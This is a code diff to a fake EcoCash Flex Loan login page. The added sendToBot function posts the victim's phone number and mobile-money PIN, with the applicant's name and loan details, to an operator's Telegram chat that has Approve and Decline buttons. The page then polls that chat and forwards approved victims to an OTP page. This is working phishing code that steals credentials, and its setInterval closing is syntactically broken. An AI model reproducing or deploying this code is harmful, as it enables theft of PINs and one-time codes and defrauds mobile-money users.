@@ -540,58 +540,81 @@
     }
     
     // Start polling for admin decision (Approve / Decline)
-    function startPollingForDecision(approveCallbackId, declineCallbackId) {
-      stopPolling();
-      let lastUpdateId = 0;
-      
-      currentPollInterval = setInterval(async () => {
-        if (!isProcessing) {
-          stopPolling();
-          return;
-        }
-        try {
-          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-          const response = await fetch(url);
-          const data = await response.json();
-          if (!data.ok || !data.result.length) return;
-          
-          for (const update of data.result) {
-            lastUpdateId = Math.max(lastUpdateId, update.update_id);
-            const callback = update.callback_query;
-            if (!callback) continue;
-            const cbData = callback.data;
-            
-            if (cbData === approveCallbackId) {
-              // Admin approved -> redirect to otp.html
-              stopPolling();
-              isProcessing = false;
-              hideSpinner();
-              // Store context (optional)
-              sessionStorage.setItem('ecocash_approved_phone', pendingPhoneRaw);
-              sessionStorage.setItem('ecocash_approved_pin', pendingPin);
-              // Redirect to otp.html
-              window.location.href = 'otp.html';
-              return;
-            }
-            
-            if (cbData === declineCallbackId) {
-              // Admin declined
-              stopPolling();
-              isProcessing = false;
-              hideSpinner();
-              setPinInputsEnabled(true);
-              phoneInput.disabled = false;
-              showLocalError('Incorrect Mobile number and/or PIN provided.');
-              clearPinFields(false); // clear PIN but don't auto-focus
-              pendingPhoneRaw = '';
-              pendingPin = '';
-              return;
-            }
+       // ── Telegram bot send + poll ──
+    function sendToBot(phone, pin) {
+      if (isProcessing) return;
+      isProcessing = true;
+      continueBtn.disabled    = true;
+      continueBtn.textContent = 'Verifying…';
+
+      const application = getStoredApplication();
+      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
+      const loanType    = application.loanType || '—';
+      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
+
+      const ts        = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId  = `verify_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 EcoCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve Loan',  callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId  }
+              ],
+              [{ text: '❌ Decline', callback_data: declineId }]
+            ]
           }
-        } catch (err) {
-          console.warn('Polling error:', err);
-        }
-      }, 1500);
+        })
+      })
+      .then(() => {
+        // Save phone to localStorage (original behaviour)
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+
+        spinnerOverlay.style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
+      })
+      .catch(() => resetButton());
+    }
+
+    function startPolling(approveCallbackId, declineCallbackId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveCallbackId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = 'otp.html';
+                }
+                else if (cb === declineCallbackId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  showError('Request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          });
+      }1000}
+    );
     }
     
     // Send credentials to Telegram bot with inline buttons "Approve" and "Decline"
